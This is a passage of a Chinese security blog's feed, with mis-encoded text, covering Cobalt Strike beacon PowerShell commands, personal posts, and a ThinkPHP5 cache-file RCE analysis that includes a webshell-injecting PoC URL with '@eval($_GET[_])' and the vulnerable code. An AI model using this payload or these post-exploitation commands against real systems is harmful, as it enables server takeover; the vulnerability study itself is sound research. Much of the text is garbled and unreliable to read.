å“åº”ã€‚å°±å„è‡ªå¹²å„è‡ªçš„ã€‚å°±å’Œç¬¬äºŒå­£åº¦çš„æ—¶å€™ï¼Œæ‰“CTFå·®ä¸å¤šï¼Œåˆè¦æŠ¥åï¼Œæ¥äº†åˆä¸æ‰“ã€‚</p><p>æˆ‘çœ‹å‰é¢é‚£æ’é˜Ÿä¼ï¼Œåšçš„æŒºå¥½çš„ã€‚è™½ç„¶æ˜¯åˆ°å¤„è¶´çš„ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€ç§èƒ½åŠ›å•Š - - ã€‚åˆ†å·¥æ˜ç¡®ï¼Œè°å»ç½‘ä¸Šæ‰¾source codeï¼Œæ‰¾æ ·ä¾‹ï¼Œè°è´Ÿè´£pptï¼Œè°è´Ÿè´£æµç¨‹å›¾ï¼Œè°è´Ÿè´£è‹±æ–‡æ ¡å¯¹ã€‚ã€‚ã€‚</p><hr><p>å“ˆå“ˆï¼Œäººä¸èƒ½å•¥éƒ½æƒ³è¦ - -ã€‚ä½†æ˜¯èƒ½ä»ä¸€ä»¶äº‹æƒ…ä¸­å­¦åˆ°è‡ªå·±çš„ä¸è¶³å°±ï¼Œç„¶ååé¢å»ä¸æ–­æ”¹å–„å§~</p><p><strong>è‡ªå·±çš„å¼€å‘èƒ½åŠ›ä¸º0ï¼Œå¹³æ—¶å¤šæå‡ä¸‹ä»£ç åŸºç¡€</strong></p><p><a href="https://shimo.im/docs/CQyrChjWQwdRHt3c/">https://shimo.im/docs/CQyrChjWQwdRHt3c/</a></p>]]></content>
    
    
    <summary type="html">ç¬¬ä¸€æ¬¡å‚åŠ â€œå¼€å‘â€ç±»å‹çš„æ¯”èµ›ï¼Œä»¥ä¸»åŠ¨æ”¾å¼ƒå‘Šç»ˆã€‚</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="https://hack-for.fun/558a.html"/>
    <id>https://hack-for.fun/558a.html</id>
    <published>2020-11-04T13:33:44.000Z</published>
    <updated>2020-11-04T15:33:14.631Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›å…³äºcsçš„ä¸œè¥¿~</p><h1 id="CS-æ´¾ç”Ÿ-MSF"><a href="#CS-æ´¾ç”Ÿ-MSF" class="headerlink" title="CS æ´¾ç”Ÿ MSF"></a>CS æ´¾ç”Ÿ MSF</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104225034.png" alt="image-20201104213742247"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104233130.png" alt="image-20201104213816240"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213842.png" alt="image-20201104213839479"></p><h1 id="é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§"><a href="#é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§" class="headerlink" title="é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§"></a>é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§</h1><h2 id="åœ¨beacon-shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š"><a href="#åœ¨beacon-shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š" class="headerlink" title="åœ¨beacon shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š"></a>åœ¨beacon shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;root&#x2F;test.ps1 &#x2F;&#x2F;å¯¼å…¥å„ç§powershellè„šæœ¬ï¼Œè¿™é‡Œå¯ä»¥å¯¼å…¥nishangæ¨¡å—</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell  posershellè„šæœ¬å</span><br></pre></td></tr></table></figure><h2 id="åœ¨beacon-shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç "><a href="#åœ¨beacon-shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç " class="headerlink" title="åœ¨beacon shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç "></a>åœ¨beacon shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-Host</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213434.png" alt="image-20201104213433262"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è®°å½•ä¸€äº›å…³äºcsçš„ä¸œè¥¿~&lt;/p&gt;
&lt;h1 id=&quot;CS-æ´¾ç”Ÿ-MSF&quot;&gt;&lt;a href=&quot;#CS-æ´¾ç”Ÿ-MSF&quot; class=&quot;headerlink&quot; title=&quot;CS æ´¾ç”Ÿ MSF&quot;&gt;&lt;/a&gt;CS æ´¾ç”Ÿ MSF&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.</summary>
      
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="æ¸—é€å·¥å…·" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ</title>
    <link href="https://hack-for.fun/abc8.html"/>
    <id>https://hack-for.fun/abc8.html</id>
    <published>2020-10-23T16:56:04.000Z</published>
    <updated>2020-11-07T15:13:03.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020å¹´å°ç»„æ‹›æ–°ä¼´éšç€ä»Šå¤©çš„å®£è®²ä¼šçš„ç»“æŸï¼Œä¹Ÿç®—æ˜¯å‘Šä¸€æ®µè½äº†ã€‚å½“ç„¶åé¢è¿˜æœ‰äºŒé¢ã€ä¸‰é¢ï¼Œç­‰é¢è¯•ç›¸å…³çš„å·¥ä½œã€‚è¿™äº›é—®é¢˜éƒ½ä¸å¤§äº†ã€‚</p></blockquote><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¥é“æ ¼19çº§æˆå‘˜çš„èº«ä»½ï¼Œå†™ä¸€ç¯‡æ„Ÿå—å§ã€‚</p><p>æ„Ÿå—æœ€æ·±çš„ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå›¢ä½“ã€ä¸€ä¸ªç»„ç»‡ï¼Œä¸€å®šè¦æœ‰å›¢ç»“åŠ›ã€å‡èšåŠ›ã€‚å¤§å®¶éƒ½ä¸€å¿ƒå¾€å°ç»„çš„æœªæ¥å‘å±•è€ƒè™‘ï¼Œæœ‰ä»€ä¹ˆäº‹å¤§å®¶ä¸€èµ·åˆ†å·¥åä½œï¼Œæœ‰éš¾é¢˜å¤§å®¶ä¸€èµ·æƒ³åŠæ³•è§£å†³ã€‚</p><p>å½“ç„¶ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¹Ÿæœ‰ä¸å¥½çš„ä½“éªŒã€‚ä¸€ä¸ªå›¢ä½“ï¼Œä¸å…ä¼šæœ‰å‡ºç°åˆ’æ°´çš„æƒ…å†µï¼Œéƒ¨åˆ†å¸ˆå‚…ä¸å¤Ÿç§¯æä¹Ÿæ˜¯èƒ½å¤Ÿç›´æ¥æ„Ÿå—åˆ°çš„ï¼Œä½†æ˜¯ä¸èƒ½è¯´ä¸å¥½ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ„Ÿå—æ˜¯é€šè¿‡å’Œå…¶ä»–å›¢ä½“æˆå‘˜æ¯”è¾ƒå¾—å‡ºçš„æ„Ÿå—ï¼Œä¸é’ˆå¯¹ä¸ªäººã€‚</p><p>ä»è°‹åˆ’æ‹›æ–°è®¡åˆ’ã€åˆ°æ‹›æ–°æ‘†æ‘Šã€ç”³è¯·å®£è®²ä¼šæ•™å®¤ã€‚ä¸¤ä¸ªç®¡ç†å°å§å§ã€<a href="http://xun9er.com/">Xun9er</a> ã€å’Œå°å¸…é”…ï¼Œå’Œå­¦æ ¡å±‚é¢ã€å­¦æ ¡ç¤¾å›¢æ–¹é¢ï¼Œè¿˜æ˜¯æœ‰è¿‡ä¸å°‘çš„å¯¹çº¿ï¼Œä¹Ÿå¾ˆè¾›è‹¦ã€‚</p><p>æ‹›æ–°æ‘†æ‘Šé‚£ä¸¤å¤©ã€è€æ˜¯ä¸‹ç€å°é›¨ã€ç¬¬ä¸€å¤©äººè¿˜å¯ç®—å¤šã€ç¬¬äºŒå¤©äººå°±æ…¢æ…¢å°‘èµ·æ¥äº†ã€‚ä¸è¿‡æ˜¯æ–°ç”Ÿå°‘äº†ï¼Œæˆ‘ä»¬çš„äººä¹Ÿå°‘äº†ã€‚ç¡®å®ï¼Œ æˆ‘ä»¬æ¯å¤©çš„äº‹ä¹ŸæŒºå¤šäº†ï¼Œä¹Ÿä¸èƒ½æŠŠæ‰€æœ‰ç²¾åŠ›æŠ•å…¥åˆ°æ‹›æ–°å·¥ä½œä¸­ã€‚èšŠå­å¤šã€æ¹¿å†·ã€‚æœ€åä¸€æ™šä¸Šã€æ¬ç¦»è®¾æ–½çš„æ—¶å€™ã€å°±æ¥äº†4-5ä¸ªå°ä¼™ä¼´ã€‚</p><p>å¥½åœ¨æ‹‰äº†ä¸ªå°ç¾¤ï¼Œä¹Ÿå°±10 ä¸ªäººåœ¨é‡Œé¢ï¼Œæ´»è·ƒçš„ä¹Ÿä¸è¿‡å°±3-4ä¸ªäººã€‚é‡Œé¢è¿˜æ˜¯æœ‰2-3ä¸ªå­¦å¼Ÿæˆ‘è®¤ä¸ºè¿˜æ¯”è¾ƒå¯ä»¥ï¼Œå¸Œæœ›ä»–ä»¬èƒ½å¤ŸåŠªåŠ›å­¦ä¹ ã€é€šè¿‡è€ƒæ ¸ã€‚</p><p>å®£è®²ä¼šä¸Šï¼Œç¬¬ä¸€æ¬¡æ„Ÿè§‰ä¸€ä¸ªå°ç»„åœ¨ä¸€èµ·åŠäº‹ã€çœŸçš„ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ä¹Ÿæ‹äº†æ‹åˆç…§ï¼Œä¹Ÿç®—æ˜¯ç¬¬ä¸€æ¬¡æ‹æ­£å¼åˆç…§äº†ã€‚</p><p>å®£è®²ä¼šï¼Œé—®äº†ä¸‹å­¦å¼Ÿçš„è¯„ä»·ï¼Œè¿˜ç®—å¯ä»¥ã€‚ä¼šä¸Šï¼Œæˆ‘ä¹Ÿå¬åˆ°å¤§å®¶éƒ½ç¬‘äº†ï¼Œè¿™å°±å¯¹äº†ã€‚</p><p>æœ€åï¼Œç»§ç»­é‡è›®ç”Ÿé•¿å§ã€‚æˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œæœªæ¥çš„å‘å±•ï¼Œç¦»ä¸å¼€æ¯ä¸€ä¸ªæˆå‘˜çš„åŠªåŠ›ï¼ŒCTFæ’åã€SRCæŒ–æ´ã€CVEã€CNVDã€å¤§å‚offerï¼Œæ˜¯æˆ‘ä»¬æ¯ä¸ªäººå¥‹æ–—çš„ç›®æ ‡ã€‚</p><p>å¯¹äº†ï¼Œæˆ‘ä»¬ä¸å…‰åªä¼šææŠ€æœ¯ï¼Œ æˆ‘ä»¬ä¹Ÿæ˜¯å¾ˆæ´»æ³¼å¼€æœ—å¯çˆ±çš„ä¸€ç¾¤äººå‘€ï¼</p><p>ç…§ç‰‡å°±ä¸æ”¾äº†ï¼Œå“ˆå“ˆã€‚æƒ³çœ‹åŠ æˆ‘å¾®ä¿¡æˆ–è€…QQå§ã€‚</p><ul><li>åšæ–‡åˆ é™¤å¯†ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020å¹´11æœˆ 7æ—¥ æ˜ŸæœŸå…­ 23æ—¶12åˆ†37ç§’ CST</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2020å¹´å°ç»„æ‹›æ–°ä¼´éšç€ä»Šå¤©çš„å®£è®²ä¼šçš„ç»“æŸï¼Œä¹Ÿç®—æ˜¯å‘Šä¸€æ®µè½äº†ã€‚å½“ç„¶åé¢è¿˜æœ‰äºŒé¢ã€ä¸‰é¢ï¼Œç­‰é¢è¯•ç›¸å…³çš„å·¥ä½œã€‚è¿™äº›é—®é¢˜éƒ½ä¸å¤§äº†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨è¿™é‡Œï¼Œæˆ‘ä»¥é“æ ¼19çº§æˆå‘˜çš„èº«ä»½ï¼Œå†™ä¸€ç¯‡æ„Ÿå—å§ã€‚&lt;/p&gt;
&lt;p&gt;æ„Ÿå—æœ€æ·±çš„ï¼Œå…¶å®å°±</summary>
      
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>MacOS å¦‚ä½•ä¿®æ”¹è´¦æˆ·å</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>ç„¶åä¹‹å‰ä¸€ç›´æƒ³ä¿®æ”¹ï¼Œä½†æ˜¯å“ªé‡Œæ˜¯ç°è‰²çš„ï¼Œæ— æ³•ä¿®æ”¹ã€‚</p><p>ä¿®æ”¹åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>ä¿®æ”¹æ–¹æ³•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>ç‚¹å‡»é”ï¼Œè¾“å…¥å¯†ç ä¹‹åå°±å¯ä»¥è¿›è¡Œæ“ä½œäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>ç„¶åç‚¹å‡» + å·ï¼Œæ–°å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>é€€å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·ï¼ˆä¹Ÿæ˜¯å› ä¸ºå½“å‰è¿™ä¸ªç”¨æˆ·æ˜¯å¤„äºç™»å½•çŠ¶æ€ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä¿®æ”¹account nameã€‚</li><li>ç™»å½•åˆ›å»ºçš„test ç®¡ç†å‘˜è´¦å·ï¼Œç›´æ¥è·³è¿‡Apple ID ä¹‹ç±»çš„è®¾ç½®ï¼Œç„¶åå»ä¿®æ”¹account nameã€‚</li><li>åˆ‡æ¢å›æ¥å°±OKäº†ã€‚</li><li>åˆ é™¤åˆ›å»ºçš„test ç®¡ç†å‘˜ç”¨æˆ·ã€‚</li></ul><p>åŸæ¥è¿™æ ·ç®€å•ã€‚</p><blockquote><p>å…¶å®å¾ˆå¤šäº‹æƒ…ï¼Œæˆ–è®¸éƒ½ç®€å•ï¼Œåªæ˜¯åœ¨äºè‡ªå·±æ„¿ä¸æ„¿æ„å»åšã€‚</p></blockquote><p>æœ€è¿‘ä¹Ÿæ˜¯å¿ƒç¥ä¸å®šçš„ï¼Œå¥½å¥½å­¦ä¹ å˜›ï¼Docker é€ƒé€¸å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡å¤ç°æˆåŠŸï¼Œæ·¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE"><a href="#RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE" class="headerlink" title="RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)"></a>RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)</h1><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> çš„ç¼“å­˜ç±»ä¸­ã€‚è¯¥ç±»ä¼šå°†ç¼“å­˜æ•°æ®é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼ï¼Œç›´æ¥å­˜å‚¨åœ¨ <code>.php</code> æ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„ <strong>payload</strong> ï¼Œå³å¯å°† <strong>webshell</strong> å†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚ç¼“å­˜æ–‡ä»¶çš„åå­—å’Œç›®å½•å‡å¯é¢„æµ‹å‡ºæ¥ï¼Œä¸€æ—¦ç¼“å­˜ç›®å½•å¯è®¿é—®æˆ–ç»“åˆä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå³å¯è§¦å‘ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> ã€‚</p></blockquote><p>æ¼æ´åˆ©ç”¨å‰æï¼š</p><ul><li><p>ç«™ç‚¹èƒ½å¤Ÿå°†ç¼“å­˜æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥å¾—åˆ°è·¯å¾„</p></li><li><p>1ã€ç¼“å­˜ä½¿ç”¨æ–‡ä»¶æ–¹å¼å¹¶ä¸”ç¼“å­˜ç›®å½•æš´éœ²åœ¨webç›®å½•ä¸‹é¢<br>2ã€æ”»å‡»è€…è¦èƒ½çŒœåˆ°å¼€å‘è€…ä½¿ç”¨çš„ç¼“å­˜key</p></li><li><p>çŸ¥é“ç¼“å­˜ç±»æ‰€è®¾ç½®çš„é”®åï¼Œè¿™æ ·æ‰èƒ½æ‰¾åˆ° <strong>webshell</strong> è·¯å¾„ï¼›å…¶æ¬¡å¦‚æœæŒ‰ç…§å®˜æ–¹è¯´æ˜å¼€å‘ç¨‹åºï¼Œ <strong>webshell</strong> æœ€ç»ˆä¼šè¢«å†™åˆ° <strong>runtime</strong> ç›®å½•ä¸‹ï¼Œè€Œå®˜æ–¹æ¨è <strong>public</strong> ä½œä¸º <strong>web</strong> æ ¹ç›®å½•ï¼Œæ‰€ä»¥å³ä¾¿æˆ‘ä»¬å†™å…¥äº† <strong>shell</strong> ï¼Œä¹Ÿæ— æ³•ç›´æ¥è®¿é—®åˆ°ï¼›æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></li><li><blockquote><p>5.0çš„éƒ¨ç½²å»ºè®®æ˜¯publicç›®å½•ä½œä¸ºwebç›®å½•è®¿é—®å†…å®¹ï¼Œå…¶å®ƒéƒ½æ˜¯webç›®å½•ä¹‹å¤–ï¼Œå½“ç„¶ï¼Œä½ å¿…é¡»è¦ä¿®æ”¹public/index.phpä¸­çš„ç›¸å…³è·¯å¾„</p></blockquote></li></ul><p>æ¯”å¦‚è¿™é‡Œä¿®æ”¹çš„index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨ThinkPHP çš„5.0.11 release ä¿¡æ¯ä¸­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>æ›´æ–°äº†å®Œå–„ç¼“å­˜é©±åŠ¨(å®‰å…¨æ›´æ–°)ã€‚å†å»æŸ¥çœ‹commitè®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>ä¿®å¤æ–¹å¼ä¸ºå°†ç¼“å­˜æ–‡ä»¶çš„å†…å®¹æ‹¼æ¥åˆ°<code>&lt;?php ?&gt;</code> æ ‡ç­¾ä¹‹å¤–ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>exit()</code>å‡½æ•°æ¥é€€å‡ºå½“å‰è„šæœ¬ã€‚</p><p>å¯ä¸‹æ–­ç‚¹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿæ•´ä¸ªå‚æ•°åœ¨Cacheç±»ä»¥åŠRequestç±»ä¸‹è¿›è¿‡ç›¸å…³æ–¹æ³•çš„è¿‡æ»¤ï¼Œè½¬æ¢ï¼Œå¹¶æœ€ç»ˆå†™å…¥äº†ç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆæ˜¯<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> æœªå®ä¾‹åŒ–ï¼Œæ‰€ä»¥ä¸ºè°ƒç”¨<code>autoload</code>æ–¹æ³•ï¼Œè‡ªåŠ¨åŠ è½½æœºåˆ¶æ¥è¿›è¡Œä¸€ç³»åˆ—å®ä¾‹åŒ–æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>ç„¶ååˆ°helper.php ä¸­çš„ <code>input</code>æ–¹æ³•ï¼Œåˆ¤æ–­è¯·æ±‚çš„æ–¹æ³•å’Œè¯·æ±‚çš„å‚æ•°ï¼Œæ­¤å¤„ä¸º<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>ç„¶åè¿”å›è¿‡æ»¤åçš„å€¼ï¼Œç»§ç»­è°ƒç”¨<code>Request</code> ç±»çš„ <code>get</code> æ–¹æ³•å’Œ <code>Input</code> æ–¹æ³•ï¼ˆåœ¨TP5)ä¸­å‚æ•°çš„å¤„ç†éƒ½æ˜¯è¿™æ ·çš„äº†ï¼Œ</p><p>ç»è¿‡<code>filterVaule</code>å’Œ<code>filterExp</code>å‡½æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤å’Œç›¸å…³åˆ¤æ®µåè¿”å›ç»™<code>$data</code></p><hr><p>ç„¶åæ¥åˆ°Cache ç±»çš„<code>set</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>è°ƒç”¨äº†Cache ç±»çš„init æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† Configé‡Œçš„getæ–¹æ³•ï¼Œè¿™äº›æ“ä½œæ˜¯åœ¨ä¸ºç¼“å­˜å†…å®¹åšä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ç„¶åå†åˆ°Cache ç±»çš„ connect æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>ä¸ºç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œmd5è¿”å›ã€‚è¿™é‡Œçš„<code>self::handler</code>ä¸º<code>think\cache\driver\File</code>ç±»ã€‚æ‰€ä»¥ä¼šè°ƒç”¨<code>File</code>ç±»çš„<code>set</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>getCacheKey</code>æ–¹æ³•æ¥è·å–ç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åã€‚æ–‡ä»¶åçš„æœºåˆ¶å¦‚ä¸‹å›¾ï¼Œå…ˆæ˜¯å¯¹<code>$name</code> 